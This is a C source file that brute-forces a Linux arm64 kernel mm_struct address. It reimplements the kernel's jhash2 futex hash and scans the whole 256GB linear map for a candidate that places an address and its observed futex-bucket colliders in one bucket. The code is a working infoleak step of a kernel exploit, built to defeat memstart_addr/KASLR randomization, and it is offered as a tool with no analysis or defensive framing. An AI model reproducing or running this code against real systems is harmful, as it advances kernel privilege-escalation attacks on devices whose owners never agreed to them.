/* Extended mm solver: scans the FULL 39-bit linear region [PAGE_OFFSET,
 * PAGE_OFFSET + 256GB) on the 0x400 SLUB grid. This covers every possible
 * per-boot memstart_addr randomization (ARM64_MEMSTART_ALIGN = 1GB quantum,
 * up to ~244GB shift) with one pass. Constraint set = pile word + all
 * same-bucket colliders from futex_probe; the candidate mm must put every
 * address in the same 2048-entry futex bucket. */
#include <stdio.h>
#include <stdint.h>
#include <string.h>
#include <stdlib.h>

static uint32_t rol32(uint32_t w, unsigned s) {
    s &= 31;
    return s ? (w << s) | (w >> (32 - s)) : w;
}

#define __jhash_mix(a, b, c)                \
    {                                       \
        a -= c; a ^= rol32(c, 4); c += b;   \
        b -= a; b ^= rol32(a, 6); a += c;   \
        c -= b; c ^= rol32(b, 8); b += a;   \
        a -= c; a ^= rol32(c, 16); c += b;  \
        b -= a; b ^= rol32(a, 19); a += c;  \
        c -= b; c ^= rol32(b, 4); b += a;   \
    }

#define __jhash_final(a, b, c)                  \
    {                                          \
        c ^= b; c -= rol32(b, 14);              \
        a ^= c; a -= rol32(c, 11);              \
        b ^= a; b -= rol32(a, 25);              \
        c ^= b; c -= rol32(b, 16);              \
        a ^= c; a -= rol32(c, 4);               \
        b ^= a; b -= rol32(a, 14);              \
        c ^= b; c -= rol32(b, 24);              \
    }

static uint32_t jhash2(const uint32_t *k, uint32_t length, uint32_t initval) {
    uint32_t a, b, c;
    a = b = c = 0xdeadbeef + (length << 2) + initval;
    while (length > 3) {
        a += k[0]; b += k[1]; c += k[2];
        __jhash_mix(a, b, c);
        length -= 3; k += 3;
    }
    switch (length) {
    case 3: c += k[2];
    case 2: b += k[1];
    case 1: a += k[0];
        __jhash_final(a, b, c);
        break;
    case 0: break;
    }
    return c;
}

static uint32_t futex_hash(uint64_t addr, uint64_t mm, uint32_t hs) {
    uint32_t k[4];
    k[0] = (uint32_t)mm;
    k[1] = (uint32_t)(mm >> 32);
    k[2] = (uint32_t)((addr & ~0xfffULL) & 0xffffffff);
    k[3] = (uint32_t)((addr & ~0xfffULL) >> 32);
    uint32_t off = (uint32_t)(addr & 0xfff);
    return jhash2(k, 4, off) & (hs - 1);
}

int main(int argc, char **argv) {
    if (argc < 4) {
        fprintf(stderr, "usage: %s minmatch pile addr1..addrN [hashsize]\n", argv[0]);
        return 2;
    }
    int minmatch = (int)strtol(argv[1], 0, 0);
    uint64_t a[32];
    int n = argc - 3;
    if (n > 31) n = 31;
    a[0] = strtoull(argv[2], 0, 16);
    for (int i = 0; i < n; i++) a[i + 1] = strtoull(argv[3 + i], 0, 16);
    uint32_t HS = argc > n + 3 ? (uint32_t)strtoul(argv[n + 3], 0, 0) : 2048;

    const uint64_t PO = 0xffffff8000000000ULL;
    const uint64_t WINDOW = 1ULL << 38;  /* full 256GB linear region */
    const uint64_t STEP = 0x400;         /* mm_struct SLUB grid */

    uint64_t hits = 0;
    uint64_t scanned = 0;
    int best = 0;
    for (uint64_t off = 0; off < WINDOW; off += STEP) {
        uint64_t mm = PO + off;
        scanned++;
        uint32_t h0 = futex_hash(a[0], mm, HS);
        int match = 0;
        for (int i = 1; i <= n; i++)
            if (h0 == futex_hash(a[i], mm, HS)) match++;
        if (match < best) continue;
        if (match > best) { best = match; printf("new best %d at mm=%016llx (shift=%llxGB rem=%llxMB)\n", best,
               (unsigned long long)mm, (unsigned long long)(off >> 30),
               (unsigned long long)((off & 0x3fffffff) >> 20)); }
        if (match >= minmatch) {
            hits++;
            printf("HIT match=%d mm=%016llx off=%llx (shift=%llxGB rem=%llxMB)\n",
                   match, (unsigned long long)mm, (unsigned long long)off,
                   (unsigned long long)(off >> 30),
                   (unsigned long long)((off & 0x3fffffff) >> 20));
        }
    }
    fprintf(stderr, "scan done: HS=%u n=%d minmatch=%d scanned=%llu hits=%llu best=%d\n",
            HS, n, minmatch, (unsigned long long)scanned, (unsigned long long)hits, best);
    return 0;
}
